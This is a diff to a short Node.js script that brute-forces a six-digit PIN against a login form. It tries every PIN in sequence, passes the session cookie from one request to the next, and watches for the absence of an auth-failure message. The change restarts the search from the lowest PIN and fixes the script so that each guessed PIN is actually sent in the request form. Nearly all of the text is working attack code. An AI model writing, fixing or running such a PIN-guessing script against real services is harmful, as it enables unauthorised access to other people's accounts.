@@ -1,6 +1,6 @@
 const rp = require('request-promise')
 
-let responseId = 'VkFORE5SNjA3NzMx'
+let responseId = 'RjQwMEhFNjA3NzMx'
 let sessionId = 'SDVESEtQNjA3NzMx'
 
 let options = {
@@ -32,7 +32,7 @@ let options = {
 const timeout = ms => new Promise((resolve, reject) => setTimeout(resolve, ms))
 
 async function main () {
-  for (let pin = 396257; pin < 999999; pin++) {
+  for (let pin = 000001; pin < 999999; pin++) {
     await rp(options)
       .then((response) => {
         // Check if the body doesn't contain the Auth Failure message here.
@@ -50,8 +50,7 @@ async function main () {
         // Split on the `=` and set the responseId appropriately.
         console.log(response.headers['set-cookie'])
 		responseId = response.headers['set-cookie']
-		console.log(options.form.pin)
-		options.pin = pin
+		options.form.pin = pin
 		console.log(options.form.pin)
 		
       })
